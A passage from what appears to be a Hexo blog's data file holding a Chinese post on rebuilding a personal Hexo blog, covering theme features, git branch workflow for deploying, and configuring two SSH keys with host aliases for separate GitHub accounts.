丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）\n- 可自定义的数据的友情链接页面\n- 支持文章置顶和文章打赏\n- 支持 `MathJax`\n- `TOC` 目录\n- 可设置复制文章内容时追加版权信息\n- 可设置阅读文章时做密码验证\n- [Gitalk](https://gitalk.github.io/)、[Gitment](https://imsun.github.io/gitment/)、[Valine](https://valine.js.org/) 和 [Disqus](https://disqus.com/) 评论模块（推荐使用 `Gitalk`）\n- 集成了[不蒜子统计](http://busuanzi.ibruce.info/)、谷歌分析（`Google Analytics`）和文章字数统计等功能\n- 支持在首页的音乐播放和视频播放功能\n\n **增加的工作或特性(未打钩的是已做但还没更新到源码的)**:\n\n- 修改了原主题的一些`bug`   2019.08.05\n- 加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09\n- 增加`留言板`功能          2019.08.05\n- 在关于板块,加入`简历`功能页   2019.08.05\n- 增加视听[视觉听觉影音]板块       2019.08.10\n- 支持`emoji`表情，用`markdown emoji`语法书写直接生成对应的能**跳跃**的表情。  2019.08.10\n- 增加网站运行时间显示  2019.08.10\n- 增加`动漫模型`     2019.08.10\n- 整体替换Banner图片和文章特色图片   2019.08.10\n- 增加分类`相册`功能         2019.08.29\n- 去掉标签页,将其合并至`分类`页中                2019.09.01\n- 修改了一些控件的参数   2019.09.01\n- 修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01\n- 解决首页文章列表卡片上方 `border-radius`圆角失效的bug  2019.09.01\n- 添加页面樱花飘落动效            2019.09.09\n- 添加鼠标点击烟花爆炸动效   2019.09.09\n- 加入天气接口控件   2019.09.09\n- 加入鼠标点击文字特效   2019.09.10\n- 添加页面雪花飘落动效            2019.09.10\n-  添加在线聊天插件            2019.09.12\n-  持续更新...\n\n---\n\n**简单使用方法：**\n1. `star` 本项目\n\n2. 安装[Git](https://git-scm.com/downloads), 安装[nodeJS](https://nodejs.org/en/)\n\n3. 你可以直接`fork`一份源码到你的仓库，`clone`到本地\n\n4. 在本地博客仓库运行`npm i`命令安装依赖包\n\n5. 修改配置信息，改成自己的信息\n\n6. 运行命令`hexo  clean`（清除生成文件），`hexo g`（生成网页）， `hexo  s`（本地预览），`hexo d`（部署）\n\n   \n\n## 博客模板源文件使用方法详解\n\n这两天为了解决协会博客的奇葩问题和重建自己的博客真是查了不少资料，恶补了一波git，算是基本弄清楚了git的简单使用原理以及hexo这种博客模板的基本结构和工作原理（当然也只是会用不会写，刚刚试图魔改就失败了，害）。\n\n**hexo博客目录结构**\n\n```\n- node_modules\t\t//node.js库文件按\n- public\t\t//hexo d 发布的目录\n- scaffolds\t\t//hexo 模板文件\n- source\t\t//网站源码\n    - _data\n    - _posts\n    - about\n    - archives\n    - categories\n    - friends\n    - tags\n- themes\t\t//主题源码\n```\n\n而一个现成的博客模板的核心文件只有五个\n\n```\nscaffolds\nsource\nthemes\n_config.yml\npackage.json\n```\n\n除了这五个，其它的文件都是附加产品\n\n把一个博客模板clone到本地仓库后，只有这五个文件是必须的，其它的都可以删了，然后使用\n\n```bash\nnpm install hexo\t//安装hexo框架\nnpm install\t\t//安装必要插件\nnpm install hexo-deployer-git\t\t//安装hexo的deployer插件\n```\n\n如果clone下来的源码有`node_modules`，`package-lock.json`，`db.json`文件的话，则只要使用`npm install `命令即可，如果有问题的话，就把其它的东西删掉，留下五个核心文件，再跑一遍上面三个命令就行\n\n\n\n如果是第一次搭建博客的话，这里有一个关键技巧，**以上操作切换到hexo分支上进行，然后保证`_config.yml`文件中的deploy参数中的branch（分支）参数为`master`**。\n\n```\ngit checkout -b hexo\t\t//新建并切换到hexo分支\n```\n\n这样就可以使得`hexo d`上传的分支为master分支，而源码push的分支为`hexo`。我们就可以实现在一个仓库中通过两个不同分支同时保存网站和源码（记得把github pages调到master分支上，2020年以后github的默认分支变成了main分支）\n\n每次在提交博客前，先使用“git”三连上传源码备份\n\n```\ngit add.\ngit commit -m \"message\"\ngit push origin hexo\t\t//切记这里是hexo分支\n```\n\n养成好习惯\n\n然后再用`hexo g -d`命令提交博客\n\n这里还有一个小技巧，万一哪天太久没写博客或者脑抽忘了在push后面加上 origin hexo，那可就麻烦大了，虽然有补救措施，但我们应该避免这种麻烦\n\n这时可以使用\n\n```bash\ngit branch --set-upstream-to=origin/hexo hexo\n```\n\n这条命令指定hexo分支的默认远程上传仓库为hexo，这样hexo 默认`git push`的就是 hexo分支，大大降低手残操作带来的麻烦的可能性。\n\n## 在一个电脑上使用两个ssh的方法\n\n有时候我们会遇到这种情况，手上有两个git账号要管理，一个私人的一个公有的（或者干脆就有两个私人的），但使用ssh远程连接时会遇到问题。\n\n一个ssh密钥只能连接一个账户或者仓库，这使我们管理两个账户时非常不方便，一个用了ssh以后另外一个就不能用了\n\n这时的解决方法是利用config文件再创建一个ssh密钥并指定主机别名来连接远程git账户（无论是github还是别的git服务器都可以）\n\n用git bash或者命令行打开系统盘“用户”目录下的.ssh文件\n\n```bash\nssh-keygen -t rsa -C \"这里输入邮箱，其实输啥都行\"\t\t//创建新ssh密钥\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/Users/Apple/.ssh/id_rsa): [输入密钥文件名，直接回车就是括号中的默认名称]      //创建第二个ssh密钥不能使用默认的了，我为协会博客创建了一个id_rsa_ais,这个名字可以随便取        \n\n/Users/xxx/.ssh/id_rsa_ais\nEnter passphrase (empty for no passphrase): \t\t//添加密码，建议直接回车，使用ssh就是为了省事和安全，再加个密码多此一举了\nEnter same passphrase again: \nYour identification has been saved in /Users/Apple/.ssh/id_rsa_ais.\t//私钥\nYour public key has been saved in /Users/Apple/.ssh/id_rsa_ais.pub. //公钥\nThe key fingerprint is:\nSHA256:1gepuxDHwJRnFbKvc0Zq/NGrFGE9kEXS06jxatPPrSQ xxx@xxx.com //你刚刚输入的邮箱\nThe key's randomart image is:\n+---[RSA 2048]----+\n|      ....=*oo   |\n|     o. ooo=+ .  |\n|      oo. =+o.   |\n|       o =.o..   |\n|      . S =o.    |\n|       = =++.    |\n|      . B.=.Eo.. |\n|       o B . +o .|\n|          . o.. .. |\n+----[SHA256]-----+\n```\n\n自己把ssh公钥上传到远程git服务器上去\n\n然后打开.ssh文件中的config文件（没有就自己创建一个）\n\n添加如下代码\n\n```\n#Default GitHub\n  Host github.com\t\t//主机名称\n  HostName github.com\t//主机\n  User git\n  IdentityFile ~/.ssh/id_rsa\t//密钥文件\n\n  Host github-wustais\t//同上，这里相当于为github.com起了个别名，使用这个别名的时候用的密钥文件就会是id_rsa_ais\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_rsa_ais\t//这里你刚刚创建的密钥文件叫什么就改成什么\n```\n\n然后\n\n**将GitHub SSH仓库地址中的git@github.com替换成新建的Host别名。**\n\n```\n//修改之前\n$ git remote -v\ngithub  git@github.com:xxx/xxx.git (fetch)\ngithub  git@github.com:xxx/xxx.git (push)\n//这里如果你是使用https方式clone的仓库的话，显示的是https://github.com/xxx/xxx.git,对后续操作没什么影响\n\n//修改 remote set-url\n$ git remote set-url github  github-wustais:xxx/xxx.git\n```\n\n验证\n\n```\n//使用修改后的github-wustais SSH连接，连接成功用户是协会账户，此时公钥是id_rsa_ais\n\n$ ssh -T github-wustais\t//这里写成git@github-wustais也行\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.\t//这就是成功了，后面这句话是告诉你你没有远程操作控制台的许可，因为用了命令中用了-T参数\n\n//使用默认的git@github.com SSH去连接,连接成功用户是我的私有账户，此时公钥是id_rsa\n$ ssh -T git@github.com\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.\n```\n修改之后,需要切换成对应的ssh\n\n**有如下两种解决方法：**\n\n打开.git/config文件\n\n```plain\n更改[remote \"origin\"]项中的url  \n对应上面配置的host[remote \"origin\"] url = git@github-wustais:xxx/xxxx.git\t//这里不要git@也行\n```\n\n 或者在Git Bash中修改remote  \n\n```plain\n$ git remote rm origin\n$ git remote add origin git@github-wustais:xxx/xxxx.git\t\t//这里不要git@也行\n```\n\n验证\n```\n$ git remote -v\ngithub  github-wustais:xxx/xxx.git (fetch)\ngithub  github-wustais:xxx/xxx.git (push)\n```\n\n这时，使用的ssh就会根据.ssh/onfig文件更改为 id-rsa-ais\n\n便可以连接上远程仓库`github-wustais:xxx/xxx.git`，即`git@github.com:xxx/xxx.git`了。","source":"_posts/2021-2-1-重建博客.md","raw":"---\ntitle: 重建博客\ndate: 2021-02-01 11:41:03\nauthor: Liloong3t\nimg: \ncoverImg: /medias/banner/2.jpg\ntop: true\ncover: true\ntoc: true\nmathjax: false\nsummary: \n  倒腾了一两天把个人博客网站重建了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续慢慢更新玩玩。至于为什么重建博客，这要从一个协会博客开始说起了，不过我也早就看不惯原来那个jkyll模板的博客了，功能过于简陋。这两天解决这些破问题还顺便速成了一下git。\ntags:\n  - Hexo\n  - Github\n  - 博客\ncategories:\n  - blogs\n  - 软件安装与配置\npassword:\n---\n\n\n\n# 简短介绍\n\n倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新。\n\n本博客基于`Hexo`框架搭建，用到模板基础为[hexo-theme-matery](https://github.com/shw2018/hexo-theme-matery)主题,并在此基础之上做了很多修改的洪卫大佬的[hexo-blog-fly](https://github.com/shw2018/hexo-blog-fly.git)主题，做了一些个性化修改。洪卫大佬博客地址：[https://shw2018.github.io](https://shw2018.github.io/)，博客演示：[sunhwee.com](https://sunhwee.com)。\n\n---\n\n## 特性\n\n**原 matery 主题特性**:\n\n- 简单漂亮，文章内容美观易读\n- [Material Design](https://material.io/) 设计\n- 响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现\n- 首页轮播文章及每天动态切换 `Banner` 图片\n- 瀑布流式的博客文章列表（文章无特色图片时会有 `24` 张漂亮的图片代替）\n- 时间轴式的归档页\n- **词云**的标签页和**雷达图**的分类页\n- 丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）\n- 可自定义的数据的友情链接页面\n- 支持文章置顶和文章打赏\n- 支持 `MathJax`\n- `TOC` 目录\n- 可设置复制文章内容时追加版权信息\n- 可设置阅读文章时做密码验证\n- [Gitalk](https://gitalk.github.io/)、[Gitment](https://imsun.github.io/gitment/)、[Valine](https://valine.js.org/) 和 [Disqus](https://disqus.com/) 评论模块（推荐使用 `Gitalk`）\n- 集成了[不蒜子统计](http://busuanzi.ibruce.info/)、谷歌分析（`Google Analytics`）和文章字数统计等功能\n- 支持在首页的音乐播放和视频播放功能\n\n **增加的工作或特性(未打钩的是已做但还没更新到源码的)**:\n\n- 修改了原主题的一些`bug`   2019.08.05\n- 加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09\n- 增加`留言板`功能          2019.08.05\n- 在关于板块,加入`简历`功能页   2019.08.05\n- 增加视听[视觉听觉影音]板块       2019.08.10\n- 支持`emoji`表情，用`markdown emoji`语法书写直接生成对应的能**跳跃**的表情。  2019.08.10\n- 增加网站运行时间显示  2019.08.10\n- 增加`动漫模型`     2019.08.10\n- 整体替换Banner图片和文章特色图片   2019.08.10\n- 增加分类`相册`功能         2019.08.29\n- 去掉标签页,将其合并至`分类`页中                2019.09.01\n- 修改了一些控件的参数   2019.09.01\n- 修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01\n- 解决首页文章列表卡片上方 `border-radius`圆角失效的bug  2019.09.01\n- 添加页面樱花飘落动效            2019.09.09\n- 添加鼠标点击烟花爆炸动效   2019.09.09\n- 加入天气接口控件   2019.09.09\n- 加入鼠标点击文字特效   2019.09.10\n- 添加页面雪花飘落动效            2019.09.10\n-  添加在线聊天插件            2019.09.12\n-  持续更新...\n\n---\n\n**简单使用方法：**\n1. `star` 本项目\n\n2. 安装[Git](https://git-scm.com/downloads), 安装[nodeJS](https://nodejs.org/en/)\n\n3. 你可以直接`fork`一份源码到你的仓库，`clone`到本地\n\n4. 在本地博客仓库运行`npm i`命令安装依赖包\n\n5. 修改配置信息，改成自己的信息\n\n6. 运行命令`hexo  clean`（清除生成文件），`hexo g`（生成网页）， `hexo  s`（本地预览），`hexo d`（部署）\n\n   \n\n## 博客模板源文件使用方法详解\n\n这两天为了解决协会博客的奇葩问题和重建自己的博客真是查了不少资料，恶补了一波git，算是基本弄清楚了git的简单使用原理以及hexo这种博客模板的基本结构和工作原理（当然也只是会用不会写，刚刚试图魔改就失败了，害）。\n\n**hexo博客目录结构**\n\n```\n- node_modules\t\t//node.js库文件按\n- public\t\t//hexo d 发布的目录\n- scaffolds\t\t//hexo 模板文件\n- source\t\t//网站源码\n    - _data\n    - _posts\n    - about\n    - archives\n    - categories\n    - friends\n    - tags\n- themes\t\t//主题源码\n```\n\n而一个现成的博客模板的核心文件只有五个\n\n```\nscaffolds\nsource\nthemes\n_config.yml\npackage.json\n```\n\n除了这五个，其它的文件都是附加产品\n\n把一个博客模板clone到本地仓库后，只有这五个文件是必须的，其它的都可以删了，然后使用\n\n```bash\nnpm install hexo\t//安装hexo框架\nnpm install\t\t//安装必要插件\nnpm install hexo-deployer-git\t\t//安装hexo的deployer插件\n```\n\n如果clone下来的源码有`node_modules`，`package-lock.json`，`db.json`文件的话，则只要使用`npm install `命令即可，如果有问题的话，就把其它的东西删掉，留下五个核心文件，再跑一遍上面三个命令就行\n\n\n\n如果是第一次搭建博客的话，这里有一个关键技巧，**以上操作切换到hexo分支上进行，然后保证`_config.yml`文件中的deploy参数中的branch（分支）参数为`master`**。\n\n```\ngit checkout -b hexo\t\t//新建并切换到hexo分支\n```\n\n这样就可以使得`hexo d`上传的分支为master分支，而源码push的分支为`hexo`。我们就可以实现在一个仓库中通过两个不同分支同时保存网站和源码（记得把github pages调到master分支上，2020年以后github的默认分支变成了main分支）\n\n每次在提交博客前，先使用“git”三连上传源码备份\n\n```\ngit add.\ngit commit -m \"message\"\ngit push origin hexo\t\t//切记这里是hexo分支\n```\n\n养成好习惯\n\n然后再用`hexo g -d`命令提交博客\n\n这里还有一个小技巧，万一哪天太久没写博客或者脑抽忘了在push后面加上 origin hexo，那可就麻烦大了，虽然有补救措施，但我们应该避免这种麻烦\n\n这时可以使用\n\n```bash\ngit branch --set-upstream-to=origin/hexo hexo\n```\n\n这条命令指定hexo分支的默认远程上传仓库为hexo，这样hexo 默认`git push`的就是 hexo分支，大大降低手残操作带来的麻烦的可能性。\n\n## 在一个电脑上使用两个ssh的方法\n\n有时候我们会遇到这种情况，手上有两个git账号要管理，一个私人的一个公有的（或者干脆就有两个私人的），但使用ssh远程连接时会遇到问题。\n\n一个ssh密钥只能连接一个账户或者仓库，这使我们管理两个账户时非常不方便，一个用了ssh以后另外一个就不能用了\n\n这时的解决方法是利用config文件再创建一个ssh密钥并指定主机别名来连接远程git账户（无论是github还是别的git服务器都可以）\n\n用git bash或者命令行打开系统盘“用户”目录下的.ssh文件\n\n```bash\nssh-keygen -t rsa -C \"这里输入邮箱，其实输啥都行\"\t\t//创建新ssh密钥\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/Users/Apple/.ssh/id_rsa): [输入密钥文件名，直接回车就是括号中的默认名称]      //创建第二个ssh密钥不能使用默认的了，我为协会博客创建了一个id_rsa_ais,这个名字可以随便取        \n\n/Users/xxx/.ssh/id_rsa_ais\nEnter passphrase (empty for no passphrase): \t\t//添加密码，建议直接回车，使用ssh就是为了省事和安全，再加个密码多此一举了\nEnter same passphrase again: \nYour identification has been saved in /Users/Apple/.ssh/id_rsa_ais.\t//私钥\nYour public key has been saved in /Users/Apple/.ssh/id_rsa_ais.pub. //公钥\nThe key fingerprint is:\nSHA256:1gepuxDHwJRnFbKvc0Zq/NGrFGE9kEXS06jxatPPrSQ xxx@xxx.com //你刚刚输入的邮箱\nThe key's randomart image is:\n+---[RSA 2048]----+\n|      ....=*oo   |\n|     o. ooo=+ .  |\n|      oo. =+o.   |\n|       o =.o..   |\n|      . S =o.    |\n|       = =++.    |\n|      . B.=.Eo.. |\n|       o B . +o .|\n|          . o.. .. |\n+----[SHA256]-----+\n```\n\n自己把ssh公钥上传到远程git服务器上去\n\n然后打开.ssh文件中的config文件（没有就自己创建一个）\n\n添加如下代码\n\n```\n#Default GitHub\n  Host github.com\t\t//主机名称\n  HostName github.com\t//主机\n  User git\n  IdentityFile ~/.ssh/id_rsa\t//密钥文件\n\n  Host github-wustais\t//同上，这里相当于为github.com起了个别名，使用这个别名的时候用的密钥文件就会是id_rsa_ais\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_rsa_ais\t//这里你刚刚创建的密钥文件叫什么就改成什么\n```\n\n然后\n\n**将GitHub SSH仓库地址中的git@github.com替换成新建的Host别名。**\n\n```\n//修改之前\n$ git remote -v\ngithub  git@github.com:xxx/xxx.git (fetch)\ngithub  git@github.com:xxx/xxx.git (push)\n//这里如果你是使用https方式clone的仓库的话，显示的是https://github.com/xxx/xxx.git,对后续操作没什么影响\n\n//修改 remote set-url\n$ git remote set-url github  github-wustais:xxx/xxx.git\n```\n\n验证\n\n```\n//使用修改后的github-wustais SSH连接，连接成功用户是协会账户，此时公钥是id_rsa_ais\n\n$ ssh -T github-wustais\t//这里写成git@github-wustais也行\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.\t//这就是成功了，后面这句话是告诉你你没有远程操作控制台的许可，因为用了命令中用了-T参数\n\n//使用默认的git@github.com SSH去连接,连接成功用户是我的私有账户，此时公钥是id_rsa\n$ ssh -T git@github.com\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.\n```\n修改之后,需要切换成对应的ssh\n\n**有如下两种解决方法：**\n\n打开.git/config文件\n\n```plain\n更改[remote \"origin\"]项中的url  \n对应上面配置的host[remote \"origin\"] url = git@github-wustais:xxx/xxxx.git\t//这里不要git@也行\n```\n\n 或者在Git Bash中修改remote  \n\n```plain\n$ git remote rm origin\n$ git remote add origin git@github-wustais:xxx/xxxx.git\t\t//这里不要git@也行\n```\n\n验证\n```\n$ git remote -v\ngithub  github-wustais:xxx/xxx.git (fetch)\ngithub  github-wustais:xxx/xxx.git (push)\n```\n\n这时，使用的ssh就会根据.ssh/onfig文件更改为 id-rsa-ais\n\n便可以连接上远程仓库`github-wustais:xxx/xxx.git`，即`git@github.com:xxx/xxx.git`了。","slug":"2021-2-1-重建博客","published":1,"updated":"2021-02-02T04:12:08.222Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckkntx9kr002zxov7cvfsn2ej","content":"<h1 id=\"简短介绍\"><a href=\"#简短介绍\" class=\"headerlink\" title=\"简短介绍\"></a>简短介绍</h1><p>倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新。</p>\n<p>本博客基于<code>Hexo</code>框架搭建，用到模板基础为<a href=\"https://github.com/shw2018/hexo-theme-matery\" target=\"_blank\" rel=\"noopener\">hexo-theme-matery</a>主题,并在此基础之上做了很多修改的洪卫大佬的<a href=\"https://github.com/shw2018/hexo-blog-fly.git\" target=\"_blank\" rel=\"noopener\">hexo-blog-fly</a>主题，做了一些个性化修改。洪卫大佬博客地址：<a href=\"https://shw2018.github.io/\" target=\"_blank\" rel=\"noopener\">https://shw2018.github.io</a>，博客演示：<a href=\"https://sunhwee.com\" target=\"_blank\" rel=\"noopener\">sunhwee.com</a>。</p>\n<hr>\n<h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><p><strong>原 matery 主题特性</strong>:</p>\n<ul>\n<li><p>简单漂亮，文章内容美观易读</p>\n</li>\n<li><p><a href=\"https://material.io/\" target=\"_blank\" rel=\"noopener\">Material Design</a> 设计</p>\n</li>\n<li><p>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</p>\n</li>\n<li><p>首页轮播文章及每天动态切换 <code>Banner</code> 图片</p>\n</li>\n<li><p>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</p>\n</li>\n<li><p>时间轴式的归档页</p>\n</li>\n<li><p><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</p>\n</li>\n<li><p>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</p>\n</li>\n<li><p>可自定义的数据的友情链接页面</p>\n</li>\n<li><p>支持文章置顶和文章打赏</p>\n</li>\n<li><p>支持 <code>MathJax</code></p>\n</li>\n<li><p><code>TOC</code> 目录</p>\n</li>\n<li><p>可设置复制文章内容时追加版权信息</p>\n</li>\n<li><p>可设置阅读文章时做密码验证</p>\n</li>\n<li><p><a href=\"https://gitalk.github.io/\" target=\"_blank\" rel=\"noopener\">Gitalk</a>、<a href=\"https://imsun.github.io/gitment/\" target=\"_blank\" rel=\"noopener\">Gitment</a>、<a href=\"https://valine.js.org/\" target=\"_blank\" rel=\"noopener\">Valine</a> 和 <a href=\"https://disqus.com/\" target=\"_blank\" rel=\"noopener\">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</p>\n</li>\n<li><p>集成了<a href=\"http://busuanzi.ibruce.info/\" target=\"_blank\" rel=\"noopener\">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</p>\n</li>\n<li><p>支持在首页的音乐播放和视频播放功能</p>\n<p><strong>增加的工作或特性(未打钩的是已做但还没更新到源码的)</strong>:</p>\n</li>\n<li><p>修改了原主题的一些<code>bug</code>   2019.08.05</p>\n</li>\n<li><p>加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09</p>\n</li>\n<li><p>增加<code>留言板</code>功能          2019.08.05</p>\n</li>\n<li><p>在关于板块,加入<code>简历</code>功能页   2019.08.05</p>\n</li>\n<li><p>增加视听[视觉听觉影音]板块       2019.08.10</p>\n</li>\n<li><p>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。  2019.08.10</p>\n</li>\n<li><p>增加网站运行时间显示  2019.08.10</p>\n</li>\n<li><p>增加<code>动漫模型</code>     2019.08.10</p>\n</li>\n<li><p>整体替换Banner图片和文章特色图片   2019.08.10</p>\n</li>\n<li><p>增加分类<code>相册</code>功能         2019.08.29</p>\n</li>\n<li><p>去掉标签页,将其合并至<code>分类</code>页中                2019.09.01</p>\n</li>\n<li><p>修改了一些控件的参数   2019.09.01</p>\n</li>\n<li><p>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01</p>\n</li>\n<li><p>解决首页文章列表卡片上方 <code>border-radius</code>圆角失效的bug  2019.09.01</p>\n</li>\n<li><p>添加页面樱花飘落动效            2019.09.09</p>\n</li>\n<li><p>添加鼠标点击烟花爆炸动效   2019.09.09</p>\n</li>\n<li><p>加入天气接口控件   2019.09.09</p>\n</li>\n<li><p>加入鼠标点击文字特效   2019.09.10</p>\n</li>\n<li><p>添加页面雪花飘落动效            2019.09.10</p>\n</li>\n<li><p>添加在线聊天插件            2019.09.12</p>\n</li>\n<li><p>持续更新…</p>\n</li>\n</ul>\n<hr>\n<p><strong>简单使用方法：</strong></p>\n<ol>\n<li><p><code>star</code> 本项目</p>\n</li>\n<li><p>安装<a href=\"https://git-scm.com/downloads\" target=\"_blank\" rel=\"noopener\">Git</a>, 安装<a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"noopener\">nodeJS</a></p>\n</li>\n<li><p>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地</p>\n</li>\n<li><p>在本地博客仓库运行<code>npm i</code>命令安装依赖包</p>\n</li>\n<li><p>修改配置信息，改成自己的信息</p>\n</li>\n<li><p>运行命令<code>hexo  clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo  s</code>（本地预览），<code>hexo d</code>（部署）</p>\n</li>\n</ol>\n<h2 id=\"博客模板源文件使用方法详解\"><a href=\"#博客模板源文件使用方法详解\" class=\"headerlink\" title=\"博客模板源文件使用方法详解\"></a>博客模板源文件使用方法详解</h2><p>这两天为了解决协会博客的奇葩问题和重建自己的博客真是查了不少资料，恶补了一波git，算是基本弄清楚了git的简单使用原理以及hexo这种博客模板的基本结构和工作原理（当然也只是会用不会写，刚刚试图魔改就失败了，害）。</p>\n<p><strong>hexo博客目录结构</strong></p>\n<pre><code>- node_modules        //node.js库文件按\n- public        //hexo d 发布的目录\n- scaffolds        //hexo 模板文件\n- source        //网站源码\n    - _data\n    - _posts\n    - about\n    - archives\n    - categories\n    - friends\n    - tags\n- themes        //主题源码</code></pre><p>而一个现成的博客模板的核心文件只有五个</p>\n<pre><code>scaffolds\nsource\nthemes\n_config.yml\npackage.json</code></pre><p>除了这五个，其它的文件都是附加产品</p>\n<p>把一个博客模板clone到本地仓库后，只有这五个文件是必须的，其它的都可以删了，然后使用</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo    //安装hexo框架\n<span class=\"token function\">npm</span> <span class=\"token function\">install</span>        //安装必要插件\n<span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git        //安装hexo的deployer插件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>如果clone下来的源码有<code>node_modules</code>，<code>package-lock.json</code>，<code>db.json</code>文件的话，则只要使用<code>npm install</code>命令即可，如果有问题的话，就把其它的东西删掉，留下五个核心文件，再跑一遍上面三个命令就行</p>\n<p>如果是第一次搭建博客的话，这里有一个关键技巧，<strong>以上操作切换到hexo分支上进行，然后保证<code>_config.yml</code>文件中的deploy参数中的branch（分支）参数为<code>master</code></strong>。</p>\n<pre><code>git checkout -b hexo        //新建并切换到hexo分支</code></pre><p>这样就可以使得<code>hexo d</code>上传的分支为master分支，而源码push的分支为<code>hexo</code>。我们就可以实现在一个仓库中通过两个不同分支同时保存网站和源码（记得把github pages调到master分支上，2020年以后github的默认分支变成了main分支）</p>\n<p>每次在提交博客前，先使用“git”三连上传源码备份</p>\n<pre><code>git add.\ngit commit -m \"message\"\ngit push origin hexo        //切记这里是hexo分支</code></pre><p>养成好习惯</p>\n<p>然后再用<code>hexo g -d</code>命令提交博客</p>\n<p>这里还有一个小技巧，万一哪天太久没写博客或者脑抽忘了在push后面加上 origin hexo，那可就麻烦大了，虽然有补救措施，但我们应该避免这种麻烦</p>\n<p>这时可以使用</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> branch --set-upstream-to<span class=\"token operator\">=</span>origin/hexo hexo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这条命令指定hexo分支的默认远程上传仓库为hexo，这样hexo 默认<code>git push</code>的就是 hexo分支，大大降低手残操作带来的麻烦的可能性。</p>\n<h2 id=\"在一个电脑上使用两个ssh的方法\"><a href=\"#在一个电脑上使用两个ssh的方法\" class=\"headerlink\" title=\"在一个电脑上使用两个ssh的方法\"></a>在一个电脑上使用两个ssh的方法</h2><p>有时候我们会遇到这种情况，手上有两个git账号要管理，一个私人的一个公有的（或者干脆就有两个私人的），但使用ssh远程连接时会遇到问题。</p>\n<p>一个ssh密钥只能连接一个账户或者仓库，这使我们管理两个账户时非常不方便，一个用了ssh以后另外一个就不能用了</p>\n<p>这时的解决方法是利用config文件再创建一个ssh密钥并指定主机别名来连接远程git账户（无论是github还是别的git服务器都可以）</p>\n<p>用git bash或者命令行打开系统盘“用户”目录下的.ssh文件</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">ssh-keygen -t rsa -C <span class=\"token string\">\"这里输入邮箱，其实输啥都行\"</span>        //创建新ssh密钥\nGenerating public/private rsa key pair.\nEnter <span class=\"token function\">file</span> <span class=\"token keyword\">in</span> <span class=\"token function\">which</span> to save the key <span class=\"token punctuation\">(</span>/Users/Apple/.ssh/id_rsa<span class=\"token punctuation\">)</span>: <span class=\"token punctuation\">[</span>输入密钥文件名，直接回车就是括号中的默认名称<span class=\"token punctuation\">]</span>      //创建第二个ssh密钥不能使用默认的了，我为协会博客创建了一个id_rsa_ais,这个名字可以随便取        \n\n/Users/xxx/.ssh/id_rsa_ais\nEnter passphrase <span class=\"token punctuation\">(</span>empty <span class=\"token keyword\">for</span> no passphrase<span class=\"token punctuation\">)</span>:         //添加密码，建议直接回车，使用ssh就是为了省事和安全，再加个密码多此一举了\nEnter same passphrase again: \nYour identification has been saved <span class=\"token keyword\">in</span> /Users/Apple/.ssh/id_rsa_ais.    //私钥\nYour public key has been saved <span class=\"token keyword\">in</span> /Users/Apple/.ssh/id_rsa_ais.pub. //公钥\nThe key fingerprint is:\nSHA256:1gepuxDHwJRnFbKvc0Zq/NGrFGE9kEXS06jxatPPrSQ xxx@xxx.com //你刚刚输入的邮箱\nThe key's randomart image is:\n+---<span class=\"token punctuation\">[</span>RSA 2048<span class=\"token punctuation\">]</span>----+\n<span class=\"token operator\">|</span>      <span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token operator\">=</span>*oo   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>     o. ooo<span class=\"token operator\">=</span>+ <span class=\"token keyword\">.</span>  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>      oo. <span class=\"token operator\">=</span>+o.   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>       o <span class=\"token operator\">=</span>.o<span class=\"token punctuation\">..</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>      <span 